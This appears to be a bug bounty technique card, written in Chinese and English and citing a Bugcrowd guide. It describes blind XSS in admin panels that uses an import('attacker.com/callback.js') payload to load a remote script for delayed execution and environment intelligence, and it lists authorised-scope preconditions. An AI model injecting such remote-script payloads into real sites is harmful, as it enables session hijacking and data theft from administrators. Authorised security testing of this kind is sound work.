...
vuln_class: XSS
source_url: https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/
source_author: NahamSec/Bugcrowd
source_date: 2025-08
...
# Blind XSS with JS import() Long-Term Callback

## 核心思路

Inject import('attacker.com/callback.js') payload for delayed execution & env intel

## 前置条件

- 目标明确在授权 Bug Bounty scope 内，且 rules 未禁止该测试类别。
- 存在与 `XSS` 相关的业务对象、接口、前端入口或集成链路。
- 使用自有测试账号、测试租户、sandbox 或平台允许的测试数据。
- 如果涉及支付/账号/隐私/生产状态变化，必须先确认项目允许并采用最小影响验证。

## 完整技法细节

- 来源要点：Long-term admin panel tracking/chaining; high-payout potential vs instant payloads
- 适用场景：Admin workflows
...
- 本条技巧的价值点：Long-term admin panel tracking/chaining; high-payout potential vs instant payloads
...
- https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/
